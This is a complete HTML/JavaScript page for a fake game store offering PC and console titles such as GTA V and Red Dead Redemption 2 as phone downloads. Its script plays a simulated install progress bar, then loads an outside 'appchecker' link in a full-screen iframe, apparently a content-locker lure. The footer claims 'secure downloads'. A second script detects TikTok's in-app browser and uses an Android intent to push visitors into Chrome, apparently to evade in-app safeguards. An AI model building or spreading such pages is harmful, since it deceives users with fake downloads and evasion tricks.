<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OGAM STORE</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
body{
margin:0;
font-family:Orbitron;
background: radial-gradient(circle at top,#0f172a,#020617);
color:white;
overflow-x:hidden;
}

/* glow */
body::before{
content:"";
position:fixed;
width:500px;
height:500px;
background:radial-gradient(circle,#00ffcc55,transparent 60%);
top:-100px;
left:-100px;
filter:blur(60px);
animation:move 6s infinite alternate;
}
@keyframes move{
from{transform:translate(0,0);}
to{transform:translate(120px,80px);}
}

/* NAV */
nav{
display:flex;
justify-content:space-between;
align-items:center;
padding:15px 30px;
backdrop-filter:blur(15px);
background:rgba(15,23,42,0.6);
position:sticky;
top:0;
z-index:1000;
border-bottom:1px solid #1e293b;
}

.logo{
display:flex;
align-items:center;
gap:10px;
font-weight:900;
text-shadow:0 0 20px #00ffcc;
}
.logo span{color:#00ffcc;}

/* HERO */
.hero{
text-align:center;
padding:40px 20px;
}
.hero h1{
font-size:55px;
margin:0;
background:linear-gradient(90deg,#00ffcc,#3b82f6,#a855f7);
-webkit-background-clip:text;
-webkit-text-fill-color:transparent;
}
.hero p{opacity:0.7;}

/* GRID */
.games{
display:grid;
grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
gap:22px;
padding:30px;
}

/* CARD */
.card{
background:rgba(17,24,39,0.8);
border:1px solid #1e293b;
border-radius:16px;
overflow:hidden;
transition:0.3s;
}
.card:hover{
transform:translateY(-10px);
box-shadow:0 20px 40px rgba(0,255,204,0.2);
}
.card img{
width:100%;
height:160px;
object-fit:cover;
}
.card-body{padding:12px;}
.title{color:#00ffcc;font-weight:800;}

.meta{
display:flex;
justify-content:space-between;
font-size:12px;
margin-top:8px;
}

.rating,.downloads{
background:#0f172a;
padding:5px 8px;
border-radius:8px;
border:1px solid #1e293b;
}

.btn{
margin-top:10px;
padding:10px;
text-align:center;
border-radius:10px;
cursor:pointer;
font-weight:800;
background:linear-gradient(90deg,#00ffcc,#3b82f6);
color:black;
}

/* MODALS */
.modal{
position:fixed;
inset:0;
background:rgba(0,0,0,0.85);
display:none;
align-items:center;
justify-content:center;
z-index:9999;
}

/* BOX */
.box{
width:360px;
background:#0f172a;
border:1px solid #1e293b;
border-radius:15px;
padding:20px;
text-align:center;
}

/* PLATFORM BUTTONS */
.platform-btn{
width:100%;
display:flex;
align-items:center;
justify-content:center;
gap:12px;
padding:14px;
margin:12px 0;
border-radius:12px;
border:1px solid #1e293b;
cursor:pointer;
font-size:16px;
font-weight:800;
transition:0.3s;
color:white;
background:#0f172a;
}

.platform-btn i{font-size:22px;}

.android i{color:#22c55e;}
.ios i{color:#3b82f6;}

.platform-btn:hover{
transform:scale(1.05);
background:#111827;
}

/* INSTALL */
.bar{
width:100%;
height:8px;
background:#1e293b;
border-radius:10px;
overflow:hidden;
}
.bar span{
display:block;
height:100%;
width:0;
background:linear-gradient(90deg,#00ffcc,#3b82f6);
}
#percent{
font-size:35px;
color:#00ffcc;
}

/* IFRAME */
.frameBox{
width:92%;
height:92%;
border-radius:15px;
overflow:hidden;
border:1px solid #00ffcc33;
}
iframe{
width:100%;
height:100%;
border:none;
background:white;
}

/* FOOTER */
footer{
text-align:center;
opacity:0.5;
font-size:12px;
padding:15px;
}

/* ===== TIKTOK BROWSER FIX (ADDED ONLY) ===== */
#ttOverlay{
position:fixed;
inset:0;
background:rgba(0,0,0,.95);
z-index:999999;
display:none;
align-items:center;
justify-content:center;
flex-direction:column;
text-align:center;
color:#fff;
padding:20px;
}
#ttOverlay h2{margin-bottom:10px}
#ttOverlay p{opacity:.7;margin-bottom:20px}
#ttOverlay button{
padding:12px 18px;
border:none;
border-radius:10px;
background:#3b82f6;
color:#fff;
font-weight:800;
cursor:pointer;
}
</style>
</head>

<body>

<nav>
<div class="logo">
<i class="fa-solid fa-gamepad"></i>
<span>OGAM STORE</span>
</div>
</nav>

<div class="hero">
<h1>OGAM STORE</h1>
<p>Ultra Gaming Experience • 3D Neon Edition</p>
</div>

<div class="games" id="games"></div>

<!-- PLATFORM -->
<div class="modal" id="platformModal">
  <div class="box">
    <h3>Choose your phone</h3>

    <button class="platform-btn android" onclick="choose('Android')">
      <i class="fa-brands fa-android"></i>
      Android
    </button>

    <button class="platform-btn ios" onclick="choose('iOS')">
      <i class="fa-brands fa-apple"></i>
      iOS
    </button>
  </div>
</div>

<!-- INSTALL -->
<div class="modal" id="installModal">
  <div class="box">
    <img id="img" style="width:100%;border-radius:10px;">
    <h3 id="title"></h3>
    <p id="status"></p>

    <div class="bar"><span id="bar"></span></div>
    <h1 id="percent">0%</h1>
  </div>
</div>

<!-- LINK -->
<div class="modal" id="linkModal">
  <div class="frameBox">
    <iframe id="frame"></iframe>
  </div>
</div>

<footer>
Official Gaming Store • Secure downloads & verified content<br>
© 2026 OGAM STORE • All rights reserved
</footer>

<!-- YOUR SCRIPT (UNCHANGED) -->
<script>

const link="https://appchecker.space/cl/i/rnnqgv";
let current=null;

const games=[
["Spider-Man","4.9","12.4M","https://cdn.cloudflare.steamstatic.com/steam/apps/1817070/header.jpg"],
["GTA V","4.8","25M","https://cdn.cloudflare.steamstatic.com/steam/apps/271590/header.jpg"],
["Forza Horizon 5","4.7","8.9M","https://cdn.cloudflare.steamstatic.com/steam/apps/1551360/header.jpg"],
["Rust","4.8","14M","https://cdn.cloudflare.steamstatic.com/steam/apps/252490/header.jpg"],
["Red Dead Redemption 2","4.9","18M","https://cdn.cloudflare.steamstatic.com/steam/apps/1174180/header.jpg"],
["Hollow Knight","4.8","3.5M","https://cdn.cloudflare.steamstatic.com/steam/apps/367520/header.jpg"],
["BeamNG Drive","4.5","5.3M","https://cdn.cloudflare.steamstatic.com/steam/apps/284160/header.jpg"],
["Assetto Corsa","4.6","7.1M","https://cdn.cloudflare.steamstatic.com/steam/apps/244210/header.jpg"],
["Euro Truck Simulator 2","4.7","10M","https://cdn.cloudflare.steamstatic.com/steam/apps/227300/header.jpg"],
["Avatar","4.4","4.2M","https://cdn.cloudflare.steamstatic.com/steam/apps/2840770/header.jpg"],
["Demon Slayer","4.6","6.2M","https://cdn.cloudflare.steamstatic.com/steam/apps/1490890/header.jpg"],
["Poppy Playtime","4.5","9M","https://cdn.cloudflare.steamstatic.com/steam/apps/1721470/header.jpg"]
];

const g=document.getElementById("games");

games.forEach((x,i)=>{
g.innerHTML+=`
<div class="card">
<img src="${x[3]}">
<div class="card-body">
<div class="title">${x[0]}</div>

<div class="meta">
<div class="rating"><i class="fa fa-star"></i>${x[1]}</div>
<div class="downloads"><i class="fa fa-download"></i>${x[2]}</div>
</div>

<div class="btn" onclick="openP(${i})">Install</div>
</div>
</div>
`;
});

function openP(i){
current=games[i];
document.getElementById("platformModal").style.display="flex";
}

function choose(type){
document.getElementById("platformModal").style.display="none";
document.getElementById("installModal").style.display="flex";

document.getElementById("img").src=current[3];
document.getElementById("title").innerText=current[0];
document.getElementById("status").innerText="Installing for "+type;

let p=0;

let interval=setInterval(()=>{
p+=2;
document.getElementById("percent").innerText=p+"%";
document.getElementById("bar").style.width=p+"%";

if(p>=100){
clearInterval(interval);

document.getElementById("installModal").style.display="none";
document.getElementById("linkModal").style.display="flex";
document.getElementById("frame").src=link;
}

},25);
}

/* ===== TIKTOK DETECTION SCRIPT ===== */
(function () {

  function isTikTok() {
    return /TikTok|musical_ly/i.test(navigator.userAgent);
  }

  function openChrome() {
    const url = window.location.href;
    const intent = "intent://" + url.replace(/^https?:\/\//,'') +
      "#Intent;scheme=https;package=com.android.chrome;end;";
    window.location.href = intent;
    setTimeout(()=>{window.location.href=url},900);
  }

  function showOverlay() {
    const div = document.createElement("div");
    div.id="ttOverlay";
    div.innerHTML=`
      <h2>Open in Browser</h2>
      <p>For best experience open in Chrome / Safari</p>
      <button onclick="(${openChrome.toString()})()">Open Now</button>
    `;
    document.body.appendChild(div);
    div.style.display="flex";
  }

  if(isTikTok()){
    window.addEventListener("load",showOverlay);
  }

})();
</script>

</body>
</html>
